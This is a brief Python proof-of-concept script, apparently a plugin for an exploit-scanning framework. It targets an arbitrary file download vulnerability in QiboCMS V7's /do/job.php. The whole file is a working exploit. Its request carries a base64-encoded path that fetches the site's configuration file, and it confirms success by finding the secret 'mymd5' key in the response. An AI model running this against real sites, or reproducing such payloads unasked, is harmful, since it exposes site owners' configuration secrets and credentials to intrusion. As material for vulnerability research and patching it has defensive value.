#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8"
bug ="\"webdb\['mymd5'\]"
info ="/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8 存在QiboCMS V7 /do/job.php 任意文件下载漏洞"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
